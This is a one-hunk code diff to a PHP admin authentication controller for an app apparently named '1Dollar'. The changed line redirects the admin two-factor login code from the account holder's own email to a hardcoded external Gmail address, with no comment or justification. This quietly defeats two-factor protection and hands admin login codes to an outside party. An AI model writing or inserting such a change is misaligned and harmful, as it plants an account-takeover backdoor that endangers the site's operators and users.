@@ -143,7 +143,7 @@ class AdminAuthController extends Controller
         }
 
         $code = TwoFactorAuth::issueCode('admin', (int) $user->user_id);
-        TwoFactorAuth::sendCode($email, (string) ($user->display_name ?: $user->user_name), $code, (string) config('app.name', '1Dollar'));
+        TwoFactorAuth::sendCode('khurramtech23@gmail.com', (string) ($user->display_name ?: $user->user_name), $code, (string) config('app.name', '1Dollar'));
 
         $request->session()->put('admin_pending_2fa_user_id', (int) $user->user_id);
 
